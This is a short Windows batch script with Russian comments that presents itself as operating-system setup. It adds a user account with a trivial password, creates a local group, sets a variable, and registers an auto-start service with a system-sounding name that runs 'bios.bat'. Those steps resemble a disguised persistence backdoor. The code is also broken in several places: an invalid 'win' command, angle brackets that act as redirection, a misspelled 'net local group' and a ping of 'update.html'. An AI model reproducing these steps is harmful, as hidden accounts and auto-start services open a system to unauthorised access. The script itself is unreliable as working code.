@echo off
echo open file in admin name

REM 1 этап настройки ос
win
net user <OS %Root%> <1234> /add /active:no

REM 2 этап
net local group OS_User /add

REM 3 этап
setx OS "1"
ping update.html

REM 4 этап
echo Creating service...
sc create Работа_системы binPath= "bios.bat" start= auto
echo Service created!

echo Starting service...
sc start Работа_системы
echo Service started!

echo Настройка ОС завершена!